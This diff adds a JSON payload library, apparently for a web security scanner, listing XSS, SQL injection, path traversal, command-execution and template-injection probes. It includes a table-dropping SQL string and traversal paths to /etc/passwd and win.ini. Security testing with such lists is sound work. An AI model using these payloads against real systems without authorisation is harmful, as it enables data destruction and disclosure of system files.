@@ -1,0 +1,439 @@
+{
+  "metadata": {
+    "version": "1.0.0",
+    "last_updated": "2026-08-05T18:05:29.857800",
+    "total_payloads": 35,
+    "categories": [
+      "xss",
+      "sqli",
+      "lfi",
+      "rfi",
+      "rce",
+      "ssti",
+      "ssrf",
+      "xxe",
+      "open_redirect",
+      "idor",
+      "cors",
+      "jwt",
+      "graphql",
+      "nosql",
+      "ldap",
+      "xpath",
+      "command",
+      "header",
+      "cookie",
+      "user_agent"
+    ]
+  },
+  "payloads": {
+    "xss": [
+      {
+        "value": "<script>alert(1)</script>",
+        "type": "basic",
+        "tags": [
+          "alert",
+          "script"
+        ],
+        "severity": "high",
+        "id": "xss_001",
+        "hash": "38fff51cb7248a06d6142c6bdf846831"
+      },
+      {
+        "value": "<img src=x onerror=alert(1)>",
+        "type": "img",
+        "tags": [
+          "alert",
+          "img",
+          "onerror"
+        ],
+        "severity": "high",
+        "id": "xss_002",
+        "hash": "afe47532bbaed8a71b3521f79e0bc544"
+      },
+      {
+        "value": "<svg/onload=alert(1)>",
+        "type": "svg",
+        "tags": [
+          "alert",
+          "svg",
+          "onload"
+        ],
+        "severity": "high",
+        "id": "xss_003",
+        "hash": "2d084e1af988f4c5aa41c6742cea900a"
+      },
+      {
+        "value": "javascript:alert(1)",
+        "type": "url",
+        "tags": [
+          "alert",
+          "url"
+        ],
+        "severity": "medium",
+        "id": "xss_004",
+        "hash": "a20542972231390ec76ca06f060adb6d"
+      },
+      {
+        "value": "'><script>alert(1)</script>",
+        "type": "basic",
+        "tags": [
+          "alert",
+          "script",
+          "breakout"
+        ],
+        "severity": "high",
+        "id": "xss_005",
+        "hash": "d84a24590c0bea277bb57d8500074c66"
+      },
+      {
+        "value": "\"><script>alert(1)</script>",
+        "type": "basic",
+        "tags": [
+          "alert",
+          "script",
+          "breakout"
+        ],
+        "severity": "high",
+        "id": "xss_006",
+        "hash": "33f83b4039caccd26d1dc38fc2b7bc87"
+      },
+      {
+        "value": "<body/onload=alert(1)>",
+        "type": "body",
+        "tags": [
+          "alert",
+          "body",
+          "onload"
+        ],
+        "severity": "medium",
+        "id": "xss_007",
+        "hash": "90b785ba6a309f89cf29a61d40ec144d"
+      },
+      {
+        "value": "<input/onfocus=alert(1)>",
+        "type": "input",
+        "tags": [
+          "alert",
+          "input",
+          "onfocus"
+        ],
+        "severity": "medium",
+        "id": "xss_008",
+        "hash": "ff1b72c0062dec908a163643b2412518"
+      },
+      {
+        "value": "<iframe src=javascript:alert(1)>",
+        "type": "iframe",
+        "tags": [
+          "alert",
+          "iframe"
+        ],
+        "severity": "medium",
+        "id": "xss_009",
+        "hash": "1f891265ba6311359f7cc14e9ab095ce"
+      },
+      {
+        "value": "<math><maction actiontype=statusline# xss=alert(1)>",
+        "type": "math",
+        "tags": [
+          "alert",
+          "math"
+        ],
+        "severity": "low",
+        "id": "xss_010",
+        "hash": "186d8c94830d15830eaa2b590816fd04"
+      }
+    ],
+    "sqli": [
+      {
+        "value": "' OR '1'='1",
+        "type": "basic",
+        "tags": [
+          "bypass",
+          "auth"
+        ],
+        "severity": "critical",
+        "id": "sqli_001",
+        "hash": "1e54e11980633c7d1fb8a6be99e3e294"
+      },
+      {
+        "value": "' OR 1=1--",
+        "type": "basic",
+        "tags": [
+          "bypass",
+          "auth",
+          "comment"
+        ],
+        "severity": "critical",
+        "id": "sqli_002",
+        "hash": "40ed73cb0875e476395fc3a430a436c2"
+      },
+      {
+        "value": "' OR 1=1#",
+        "type": "basic",
+        "tags": [
+          "bypass",
+          "auth",
+          "comment"
+        ],
+        "severity": "critical",
+        "id": "sqli_003",
+        "hash": "31797ad5426ba28ec1b3710cd77f1b60"
+      },
+      {
+        "value": "' UNION SELECT NULL--",
+        "type": "union",
+        "tags": [
+          "union",
+          "enumeration"
+        ],
+        "severity": "critical",
+        "id": "sqli_004",
+        "hash": "c262d525ba603c79f7f5e232bb40a1eb"
+      },
+      {
+        "value": "' AND SLEEP(5)--",
+        "type": "time",
+        "tags": [
+          "time",
+          "blind"
+        ],
+        "severity": "high",
+        "id": "sqli_005",
+        "hash": "f7ca84fa482f7d134b7645b2a1ba8c96"
+      },
+      {
+        "value": "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+        "type": "time",
+        "tags": [
+          "time",
+          "blind"
+        ],
+        "severity": "high",
+        "id": "sqli_006",
+        "hash": "1e5308aec82402546e3d4b37f6af36b6"
+      },
+      {
+        "value": "'; DROP TABLE users--",
+        "type": "stacked",
+        "tags": [
+          "stacked",
+          "destructive"
+        ],
+        "severity": "critical",
+        "id": "sqli_007",
+        "hash": "11f6da3f1377f3d3bf9713bb5ebc710c"
+      },
+      {
+        "value": "' OR '1'='1' --",
+        "type": "basic",
+        "tags": [
+          "bypass",
+          "auth",
+          "comment"
+        ],
+        "severity": "critical",
+        "id": "sqli_008",
+        "hash": "876bcd814194339a48006e3538f17de9"
+      },
+      {
+        "value": "' OR '1'='1' #",
+        "type": "basic",
+        "tags": [
+          "bypass",
+          "auth",
+          "comment"
+        ],
+        "severity": "critical",
+        "id": "sqli_009",
+        "hash": "a0413bcbbb2a0a1635fa9c69f7d488af"
+      },
+      {
+        "value": "1' AND 1=1--",
+        "type": "boolean",
+        "tags": [
+          "boolean",
+          "blind"
+        ],
+        "severity": "high",
+        "id": "sqli_010",
+        "hash": "d6db6a13e17d57b25ad58e296d8aea42"
+      }
+    ],
+    "lfi": [
+      {
+        "value": "../../../etc/passwd",
+        "type": "path",
+        "tags": [
+          "file_read",
+          "unix"
+        ],
+        "severity": "high",
+        "id": "lfi_001",
+        "hash": "1fcbd5c1448a61938f3dcc0d91e2f605"
+      },
+      {
+        "value": "../../../../etc/passwd",
+        "type": "path",
+        "tags": [
+          "file_read",
+          "unix"
+        ],
+        "severity": "high",
+        "id": "lfi_002",
+        "hash": "a15e1c05f2b478299e737532b8f7a4e5"
+      },
+      {
+        "value": "../../../../../../etc/passwd",
+        "type": "path",
+        "tags": [
+          "file_read",
+          "unix"
+        ],
+        "severity": "high",
+        "id": "lfi_003",
+        "hash": "d9c8534f23dc4cf0aa4947e7eda9daa5"
+      },
+      {
+        "value": "..\\..\\..\\windows\\win.ini",
+        "type": "path",
+        "tags": [
+          "file_read",
+          "windows"
+        ],
+        "severity": "high",
+        "id": "lfi_004",
+        "hash": "eb17ed6867bf29b187b5cdcab3d5ae0b"
+      },
+      {
+        "value": "file:///etc/passwd",
+        "type": "path",
+        "tags": [
+          "file_read",
+          "unix",
+          "protocol"
+        ],
+        "severity": "high",
+        "id": "lfi_005",
+        "hash": "0f1726ba83325848d47e216b29d5ab99"
+      }
+    ],
+    "rce": [
+      {
+        "value": "?cmd=id",
+        "type": "cmd",
+        "tags": [
+          "cmd",
+          "unix"
+        ],
+        "severity": "critical",
+        "id": "rce_001",
+        "hash": "8fd4fd02953ac9d6052197bfb41c93a2"
+      },
+      {
+        "value": "?cmd=whoami",
+        "type": "cmd",
+        "tags": [
+          "cmd",
+          "unix"
+        ],
+        "severity": "critical",
+        "id": "rce_002",
+        "hash": "6bbd2e65c0c14d51b17fa337f988ca16"
+      },
+      {
+        "value": "?cmd=system('id')",
+        "type": "cmd",
+        "tags": [
+          "cmd",
+          "unix",
+          "php"
+        ],
+        "severity": "critical",
+        "id": "rce_003",
+        "hash": "0fee51e79a9040bb48996cc964f0b7a8"
+      },
+      {
+        "value": "?cmd=echo test",
+        "type": "cmd",
+        "tags": [
+          "cmd",
+          "unix"
+        ],
+        "severity": "critical",
+        "id": "rce_004",
+        "hash": "6ebeab494922644bc742a394662bf223"
+      },
+      {
+        "value": "?cmd=ls",
+        "type": "cmd",
+        "tags": [
+          "cmd",
+          "unix",
+          "enumeration"
+        ],
+        "severity": "critical",
+        "id": "rce_005",
+        "hash": "54d0bea3817a1ba8b0a46da6a66df715"
+      }
+    ],
+    "ssti": [
+      {
+        "value": "{{7*7}}",
+        "type": "basic",
+        "tags": [
+          "jinja2",
+          "template"
+        ],
+        "severity": "critical",
+        "id": "ssti_001",
+        "hash": "379d340833bbbeebcf7a121e3d874a52"
+      },
+      {
+        "value": "${7*7}",
+        "type": "basic",
+        "tags": [
+          "velocity",
+          "template"
+        ],
+        "severity": "critical",
+        "id": "ssti_002",
+        "hash": "5c4bd6a2fcf24260cc7816ecf6fb9a6a"
+      },
+      {
+        "value": "<%= 7*7 %>",
+        "type": "basic",
+        "tags": [
+          "erb",
+          "template"
+        ],
+        "severity": "critical",
+        "id": "ssti_003",
+        "hash": "67d3f3e5c1d19a054895c7a7f961cb23"
+      },
+      {
+        "value": "{{config}}",
+        "type": "config",
+        "tags": [
+          "jinja2",
+          "info_leak"
+        ],
+        "severity": "high",
+        "id": "ssti_004",
+        "hash": "9f74a092a2b9b7ccccaeb59eb79d5211"
+      },
+      {
+        "value": "{{''.__class__.__mro__}}",
+        "type": "class",
+        "tags": [
+          "jinja2",
+          "object"
+        ],
+        "severity": "high",
+        "id": "ssti_005",
+        "hash": "6703034ba0c10302e2340eeff5bf4e43"
+      }
+    ]
+  }
+}
